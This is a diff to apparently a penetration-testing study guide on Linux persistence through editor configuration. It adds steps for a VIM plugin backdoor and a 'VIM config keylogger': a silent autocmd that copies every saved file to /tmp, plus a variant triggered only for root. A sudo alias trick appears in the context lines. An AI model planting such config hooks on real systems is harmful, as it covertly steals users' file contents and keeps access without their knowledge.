@@ -17,7 +17,7 @@ linux@linuxvictim:~$ /bin/bash
 linux@linuxvictim:~$ ls -al /tmp/bashtest.txt
 -rw-rw-r-- 1 linux linux 0 Aug 26 15:20 /tmp/bashtest.txt
 ```
-
+## Attcking with VIM text editor
 #### VIM config file backdoor
 
 On many Linux systems, user-specific VIM configuration settings are located in a user’s home directory in the .vimrc file. The commands specified in the .vimrc file are executed when VIM is launched. we can leverage the VIM plugin directory. As long as the files have a .vim extension, all VIM config files located in the user’s **~/.vim/plugin** directory will be loaded
@@ -37,3 +37,32 @@ alias sudo="sudo -E"
 linux@linuxvictim:~$ source ~/.bashrc
 ```
 #### VIM config keylogger
+We can use **:autocmd** in a VIM configuration file or in the editor to set actions for a collection of predefined events. All detials commands can be found at [Vim documentation: autocmd](http://vimdoc.sourceforge.net/htmldoc/autocmd.html)
+
+Now we can set up an autocommand that fires on the BufWritePost action and then writes the content of the file to a log file we specify. We will put our command in
+```/home/linux/.vim/plugin/settings.vim```
+
+```
+:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
+```
+**BufWritePost** us the event, meaning that after a buffer is written to a file, we will perform our action. “*” specifies this action will be performed for all files being edited. **:w!** save the buffer contents, **!** is a force modifier, it will overwrite an existing file.
+
+VIM supports the use of basic if statements in its configuration scripts
+```
+:if <some condition>
+:<some command>
+:else
+:<some alternative command>
+:endif
+```
+
+below example will check if user os running as root
+
+```
+:if $USER == "root"
+:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
+:endif
+```
+
+
+
